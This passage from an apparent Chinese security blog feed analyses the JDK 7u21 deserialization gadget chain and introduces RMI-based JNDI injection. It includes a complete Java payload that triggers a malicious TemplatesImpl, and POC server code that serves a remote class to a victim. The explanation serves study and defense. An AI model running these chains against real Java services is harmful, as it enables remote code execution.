class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这个key，就是我们传入的元素，value是一个固定值木有用。</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//key不能为null</span></span><br><span class="line">        <span class="keyword">if</span> (key == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> putForNullKey(value);</span><br><span class="line">    <span class="comment">//计算key的hash值</span></span><br><span class="line">        <span class="keyword">int</span> hash = hash(key) ;</span><br><span class="line">        <span class="keyword">int</span> i = indexFor(hash, table.length);</span><br><span class="line">    <span class="comment">// 遍历已有的元素</span></span><br><span class="line">        <span class="keyword">for</span> (Entry&lt;K,V&gt; e = table[i]; e != <span class="keyword">null</span>; e = e.next) &#123;</span><br><span class="line">            Object k;</span><br><span class="line">            <span class="comment">//本意是判断最新的元素是否已经存在的元素</span></span><br><span class="line">            <span class="keyword">if</span> (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123;</span><br><span class="line">                <span class="comment">//如果是已经存在的元素，就返回已经存在的value。不插入。</span></span><br><span class="line">                V oldValue = e.value;</span><br><span class="line">                e.value = value;</span><br><span class="line">                e.recordAccess(<span class="keyword">this</span>);</span><br><span class="line">                <span class="keyword">return</span> oldValue;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        modCount++;</span><br><span class="line">    <span class="comment">//如果不是已经存在的元素，就插入到table中</span></span><br><span class="line">        addEntry(hash, key, value, i);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>我们专注于<code>if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) {</code>这句语句。（e为前一个元素，key为当前元素）</p><p>可以看到<code>key.equals(k)</code>符合我们前面说到的<code>a.equals(b)</code>的格式。在只有两个元素的情况下，k为有序集合中第一个元素，key为第二个元素。</p><p>即我们需要一个有序集合<code>{templates，proxy}</code>才能满足<code>proxy.equals(templates)</code>这一句触发语句。</p><blockquote><p> 这也就是为什么需要有序集合的原因，如果是普通集合，不会一定会符合这个<code>a.equals(b)</code>的顺序</p></blockquote><p>由于这里代码<code>(e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k)))</code>调用第三个语句就需要满足条件</p><ul><li><code>e.hash == hash</code>：templates的hash == proxy的hash</li><li><code>(k = e.key) != key</code> ：templates（就是k） ！= proxy（就是key）（我们需要||左边这个表达式不满足，才会执行右边的漏洞触发函数key.equals(k)。这是||的特性，执行到一个为true的，后面的表达式就不执行了）</li></ul><p>因为templates和proxy完全是两个不同的对象。所以第二个条件满足。</p><p>但是第一个条件需要hash相同，如果不是偷看答案的小白（我自己）肯定会突然僵住，特么这咋可能hash相等，当场直接gg。实际上套路还是很深。看hash是如何生成的</p><p>java.util.HashMap#hash</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> h = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (useAltHashing) &#123;</span><br><span class="line">            <span class="keyword">if</span> (k <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">                <span class="keyword">return</span> sun.misc.Hashing.stringHash32((String) k);</span><br><span class="line">            &#125;</span><br><span class="line">            h = hashSeed;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        h ^= k.hashCode();<span class="comment">//惊为天人的调用了我们传入的对象k的hashCode函数，也就是说我们有可能可以对于hash值进行一定的操控</span></span><br><span class="line"><span class="comment">//接下来又是一些骚操作</span></span><br><span class="line">        <span class="comment">// This function ensures that hashCodes that differ only by</span></span><br><span class="line">        <span class="comment">// constant multiples at each bit position have a bounded</span></span><br><span class="line">        <span class="comment">// number of collisions (approximately 8 at default load factor).</span></span><br><span class="line">        h ^= (h &gt;&gt;&gt; <span class="number">20</span>) ^ (h &gt;&gt;&gt; <span class="number">12</span>);</span><br><span class="line">        <span class="keyword">return</span> h ^ (h &gt;&gt;&gt; <span class="number">7</span>) ^ (h &gt;&gt;&gt; <span class="number">4</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>我们传入的obj有TemplatesImpl类，但是这个类中没有自实现hashcode方法。</p><p>有Proxy对象（进入AnnotationInvocationHandler拦截器实现类），proxy.hashCode会先进入AnnotationInvocationHandler的invoke拦截器。（跟equals一样一样的，任何函数都会先进入invoke方法）</p><p><code>sun.reflect.annotation.AnnotationInvocationHandler#invoke</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object var1, Method var2, Object[] var3)</span> </span>&#123;</span><br><span class="line">        String var4 = var2.getName();</span><br><span class="line">        Class[] var5 = var2.getParameterTypes();</span><br><span class="line">        <span class="keyword">if</span> (var4.equals(<span class="string">"equals"</span>) &amp;&amp; var5.length == <span class="number">1</span> &amp;&amp; var5[<span class="number">0</span>] == Object.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.equalsImpl(var3[<span class="number">0</span>]);<span class="comment">//我们之前payload触发在这</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">assert</span> var5.length == <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (var4.equals(<span class="string">"toString"</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">this</span>.toStringImpl();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var4.equals(<span class="string">"hashCode"</span>)) &#123;<span class="comment">//往下看！这个可爱的invoke实现上对于hashCode这个函数还是有独特处理的！！！！</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">this</span>.hashCodeImpl();<span class="comment">//进去看看</span></span><br></pre></td></tr></table></figure><p><code>sun.reflect.annotation.AnnotationInvocationHandler#hashCodeImpl</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">hashCodeImpl</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       <span class="keyword">int</span> var1 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">       Entry var3;</span><br><span class="line">       <span class="keyword">for</span>(Iterator var2 = <span class="keyword">this</span>.memberValues.entrySet().iterator(); var2.hasNext(); var1 += <span class="number">127</span> * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) &#123;</span><br><span class="line">           var3 = (Entry)var2.next();</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> var1;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>这边写的贼复杂，改成简单点</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">hashCodeImpl</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       <span class="keyword">int</span> var1 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">       Entry var3;</span><br><span class="line">    <span class="comment">//this.memberValues是我们构造AnnotationInvocationHandler时，可控的那个map</span></span><br><span class="line">       Iterator var2 = <span class="keyword">this</span>.memberValues.entrySet().iterator();<span class="comment">//获取遍历器</span></span><br><span class="line">       <span class="keyword">for</span>( ;var2.hasNext(); ) &#123;</span><br><span class="line">           var3 = (Entry)var2.next();</span><br><span class="line">           String key = var3.getKey();<span class="comment">//（可控map的键）</span></span><br><span class="line">           Object value = var3.getValue()；<span class="comment">//（可控map的值）</span></span><br><span class="line">           var1 += <span class="number">127</span> * </span><br><span class="line">               key.hashCode() ^ <span class="comment">//可控map的键 的 hashCode</span></span><br><span class="line">               memberValueHashCode(value); <span class="comment">//可控map的值的 hashCode</span></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> var1;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p><code>sun.reflect.annotation.AnnotationInvocationHandler#memberValueHashCode</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">memberValueHashCode</span><span class="params">(Object var0)</span> </span>&#123;</span><br><span class="line">        Class var1 = var0.getClass();</span><br><span class="line">        <span class="keyword">if</span> (!var1.isArray()) &#123;<span class="comment">//不是数组的话获取传入值的hashCode。</span></span><br><span class="line">            <span class="keyword">return</span> var0.hashCode(); <span class="comment">//返回var0这个对象的hashCode</span></span><br><span class="line">        ...</span><br></pre></td></tr></table></figure><p>我们的目的是为了满足以下等式：</p><p><strong>Proxy的hashCode = 127 * 可控键的hashCode ^ 可控值的hashCode == TemplatesImpl的hashCode</strong></p><blockquote><p>*与 ^（异或） ，前者优先级高，后者优先级低，所以正常从左到右运算</p><p>又 0 ^ n = n</p></blockquote><p>那么只需要可控键的hashCode等于0就会出现：</p><p><strong>127 * 0 ^ TemplatesImpl的hashCode == TemplatesImpl的hashCode</strong></p><p>this.memberValues中map中键值对的值为我们的恶意TemplatesImpl类即可，接下来需要它的键名的hashCode为0</p><p>研究员就是会寻找到一些神奇的值比如<code>&quot;f5a5a608&quot;</code>，<code>&quot;&quot;</code> 这些值的hashCode为0！！！</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g9h9uqejl8j31440akmy1.jpg" alt="hashCode为0.png"></p><p>所以我们在this.memberValues中赋值键值对 <code>(&quot;f5a5a608&quot;-&gt;TemplatesImpl恶意类)</code>即可。</p><p>看payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">//生成恶意的templates类</span></span><br><span class="line">    Templates templates = Gadgets.createTemplatesImpl(<span class="string">"calc"</span>);</span><br><span class="line">    <span class="comment">//AnnotationInvocationHandler类this.memberValues的map,填入键值对来满足hash相等</span></span><br><span class="line">    Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">    String magicStr = <span class="string">"f5a5a608"</span>;</span><br><span class="line">    <span class="comment">//String magicStr_null = "";//也可</span></span><br><span class="line">    <span class="comment">//此处需要的先往map中放入一个没用的值，之后说明</span></span><br><span class="line">    map.put(magicStr,<span class="string">"Override"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//生成proxy对象</span></span><br><span class="line">    <span class="keyword">final</span> Constructor&lt;?&gt; ctor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">    ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Templates.class,map);<span class="comment">//this.type,this.memberValues</span></span><br><span class="line">    Override proxy = (Override) Proxy.newProxyInstance(InvocationHandler.class.getClassLoader(),<span class="keyword">new</span> Class[]&#123;Override.class&#125;,invocationHandler);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//生成LinkedHashSet，按照顺序一次放入templates和proxy</span></span><br><span class="line">    HashSet set = <span class="keyword">new</span> LinkedHashSet(); <span class="comment">// 填入</span></span><br><span class="line">    set.add(templates);</span><br><span class="line">    set.add(proxy);</span><br><span class="line">    <span class="comment">//重新修改map的值</span></span><br><span class="line">    map.put(magicStr,templates);</span><br><span class="line"></span><br><span class="line">    ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">    <span class="comment">//序列化</span></span><br><span class="line">    ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">    objectOutputStream.writeObject(set);<span class="comment">//序列化对象</span></span><br><span class="line">    objectOutputStream.flush();</span><br><span class="line">    objectOutputStream.close();</span><br><span class="line">    <span class="comment">//反序列化</span></span><br><span class="line">    <span class="keyword">byte</span>[] bytes = byteArrayOutputStream.toByteArray(); <span class="comment">//读取序列化后的对象byte数组</span></span><br><span class="line">    ByteArrayInputStream byteArrayInputStream = <span class="keyword">new</span> ByteArrayInputStream(bytes);<span class="comment">//存放byte数组的输入流</span></span><br><span class="line">    ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(byteArrayInputStream);</span><br><span class="line">    Object o = objectInputStream.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="this-memberValues的键值对的值先占位"><a href="#this-memberValues的键值对的值先占位" class="headerlink" title="this.memberValues的键值对的值先占位"></a>this.memberValues的键值对的值先占位</h4><p>以上代码还会有最后一个疑问，为啥我们填入this.memberValues的map要先试用override字符串来占位，直接填入恶意的攻击类templates不行么？</p><p>确实是不行的，因为我们可以看到我们在生成LinkedHashSet时调用了<code>java.util.HashSet#add</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">add</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> map.put(e, PRESENT)==<span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里调用了我们触发漏洞的函数map.put(),同时也是按照我们的漏洞触发顺序去调用map.put，这会导致payload会在我们本地触发，之后会无法序列化成功(至于为啥序列化不成功不想追究了！)</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g9h9w99brtj321119ok7c.jpg" alt="直接templates.png"></p><p>所以一套完美的利用链就分析完了！</p><h2 id="修复情况"><a href="#修复情况" class="headerlink" title="修复情况"></a>修复情况</h2><p>我们在7u80版本中去查看AnnotationInvocationHandler的构造方法，会发现对于this.type进行了校验必须为Annotation.class。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">    Class[] var3 = var1.getInterfaces();</span><br><span class="line">    <span class="keyword">if</span> (var1.isAnnotation() &amp;&amp; var3.length == <span class="number">1</span> &amp;&amp; var3[<span class="number">0</span>] == Annotation.class) &#123;</span><br><span class="line">        <span class="keyword">this</span>.type = var1;</span><br><span class="line">        <span class="keyword">this</span>.memberValues = var2;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> AnnotationFormatError(<span class="string">"Attempt to create proxy for a non-annotation type."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果我们们使用以上的payload去打7u80版本的jdk就会在反序列化AnnotationInvocationHandler类调用其构造函数的时候，报错。</p><blockquote><p>这也就是为什么之前的payload说到在高版本创建需要使用反射把恶意的this.type写进去，当然构造时可以这样，触发时就必须走构造函数，骚操作不了了。</p></blockquote><p>主要组件的 LinkedHashSet -&gt; AnnotationInvocationHandler -&gt; templateImpl 就因为AnnotationInvocationHandler 反序列化失败而失败。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>一路分析下来，只能说这个利用链实在是太骚了。</p><p>从templates.newTransformer触发链的限制条件，使用javassist去构造templates恶意类。（其中分析了_tfactory与版本问题，payload位置static与构造函数的问题）</p><p>再通过java的动态代理特性，选中了AnnotationInvocationHandler这个拦截器。</p><p>我们通过AnnotationInvocationHandler的invoke拦截实现类的特性，选择了this.type特殊构造了AnnotationInvocationHandler类。链接了 proxy.equals(templates)到Templates.newTransformer()。</p><p>再是通过LinkedHashSet类，左打通了序列化与反序列化的入口点，右在反序列化恢复集合的过程中存在着一处a.equals(b)可以连接proxy.equals(templates)这一触发点。</p><p>最神奇的是为了满足到达触发点的要求，还反过头来利用AnnotationInvocationHandler类中的invoke方法中的hashCode路径。在AnnotationInvocationHandler构造中寻求了一处特殊的this.memberValues，来达成hash(a)=hash(b)的骚操作。</p><p>只可以说安全研究员真是大佬….这个穿针引线一处不差的。</p><p>虽然说这条利用链已经被封了好久了，但是我们也可以意识到被封杀的是AnnotationInvocationHandler构造方法处。</p><p>如果可以通过其他途径接上templates.newTransformer，就可以构筑一条新的链。因为单单templates.newTransformer是仍然可以作为payload执行的触发点的（比如7u80）。</p><h2 id="2019-12-12更新"><a href="#2019-12-12更新" class="headerlink" title="2019.12.12更新"></a>2019.12.12更新</h2><p>在看fastjsonexploit框架时，发现有Templates恶意类竟然有第二个触发点。前文中我们讲到的TemplatesImpl类是jdk自带的<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>包中的类</p><p>看了fastjsonexploit的代码后，发现在另外一个包里面有一个跟我们上面TemplatesImpl几乎完全一样的一个类。</p><p>我们在<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>的父类Templates中查找继承该父类的类。（idea下ctrl+alt+B）</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g9tyydiep2j31bc0h8wgc.jpg" alt="1212-另一个包.png"></p><p>可以发现在<code>org.apache.xalan.xsltc.trax.TemplatesImpl</code>也继承该接口。该类与之前的com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl几乎完全一致，payload也没有任何差别。只是在构造exp触发那个自定义类时，继承父类<code>AbstractTranslet</code>接口不一样（<code>org.apache.xalan.xsltc.runtime.AbstractTranslet</code>），但是如果我们是在代码中动态指定父类的话，这也无关痛痒。</p><p>在github的代码中查找继承Templates类是无法找到该类的。</p><p>因为这个类是位于xalan这个第三方包里面，而不是在jdk7本身的代码中。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>xalan<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xalan<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可见这个触发点的利用链利用条件就更加苛刻了(jdk7u21+xalan2.7.2)。</p><p>不过单独就最后的这个触发点拎出来，也是一个新的思路，这样就把对于jdk7版本的限制变成了即使是jdk8的环境下，只要使用了xalan 2.7.2这个包，也会引入一个触发点。也算是扩大了攻击面吧。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.freebuf.com/vuls/175754.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/175754.html</a></p><p><a href="https://b1ue.cn/archives/176.html" target="_blank" rel="noopener">https://b1ue.cn/archives/176.html</a></p><p><a href="https://gist.github.com/frohoff/24af7913611f8406eaf3" target="_blank" rel="noopener">https://gist.github.com/frohoff/24af7913611f8406eaf3</a></p><p><a href="https://sec.xiaomi.com/article/41" target="_blank" rel="noopener">https://sec.xiaomi.com/article/41</a></p><p><a href="https://www.cnblogs.com/rickiyang/p/11336268.html" target="_blank" rel="noopener">javassist使用全解析</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;JDK反序列化Gadgets-7u21&quot;&gt;&lt;a href=&quot;#JDK反序列化Gadgets-7u21&quot; class=&quot;headerlink&quot; title=&quot;JDK反序列化Gadgets 7u21&quot;&gt;&lt;/a&gt;JDK反序列化Gadgets 7u21&lt;/h2&gt;&lt;p&gt;预计
      
    
    </summary>
    
    
      <category term="java" scheme="http://lalajun.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>JNDI注入</title>
    <link href="http://lalajun.com/2019/10/23/JNDI%E6%B3%A8%E5%85%A5/"/>
    <id>http://lalajun.com/2019/10/23/JNDI注入/</id>
    <published>2019-10-23T07:05:28.000Z</published>
    <updated>2019-10-29T09:18:24.092Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本篇讲述了RMI-JNDI注入的利用原理，分析了利用流程；<br>使用了marshalsec反序列化工具去简单的起一个RMI/LDAP服务端<br>对于导致JNDI注入的漏洞代码扩展至com.sun.rowset.JdbcRowSetImpl函数，为fastjson反序列化起一个引子，准备新起一文。<br>分析了java版本变化对于JNDI注入的影响<br>引出了1.8u191之后的版本该如何利用JNDI注入，准备新起一文。<br>提到了LDAP-JNDI注入</p><h2 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h2><p>Java命名和目录接口（JNDI）是一种Java API，类似于一个索引中心，它允许客户端通过name发现和查找数据和对象。<br>其应用场景比如：动态加载数据库配置文件，从而保持数据库代码不变动等。<br>代码格式如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String jndiName= ...;<span class="comment">//指定需要查找name名称</span></span><br><span class="line">Context context = <span class="keyword">new</span> InitialContext();<span class="comment">//初始化默认环境</span></span><br><span class="line">DataSource ds = (DataSourse)context.lookup(jndiName);<span class="comment">//查找该name的数据</span></span><br></pre></td></tr></table></figure></p><p>这些对象可以存储在不同的命名或目录服务中，例如远程方法调用（RMI），通用对象请求代理体系结构（CORBA），轻型目录访问协议（LDAP）或域名服务（DNS）。（此篇中我们将着重讲解RMI，提到LDAP）</p><p>RMI格式:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">InitialContext var1 = <span class="keyword">new</span> InitialContext();</span><br><span class="line">DataSource var2 = (DataSource)var1.lookup(<span class="string">"rmi://127.0.0.1:1099/Exploit"</span>);</span><br></pre></td></tr></table></figure></p><h2 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h2><p>所谓的JNDI注入就是当上文代码中jndiName这个变量可控时，引发的漏洞，它将导致远程class文件加载，从而导致远程代码执行。</p><p>我们看一个利用RMI的POC，忘记从哪里收集的了。然后分析一下调用的流程。</p><h3 id="poc验证"><a href="#poc验证" class="headerlink" title="poc验证"></a>poc验证</h3><p>ClIENT.java（受害者）<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi注入;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CLIENT</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        String uri = <span class="string">"rmi://127.0.0.1:1099/aa"</span>;</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        ctx.lookup(uri);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>SERVER.java(攻击者部署)<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi注入;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SERVER</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Reference aa = <span class="keyword">new</span> Reference(<span class="string">"ExecTest"</span>, <span class="string">"ExecTest"</span>, <span class="string">"http://127.0.0.1:8081/"</span>);</span><br><span class="line">        ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(aa);</span><br><span class="line">        System.out.println(<span class="string">"Binding 'refObjWrapper' to 'rmi://127.0.0.1:1099/aa'"</span>);</span><br><span class="line">        registry.bind(<span class="string">"aa"</span>, refObjWrapper);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ExecTest.java(攻击者部署)<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 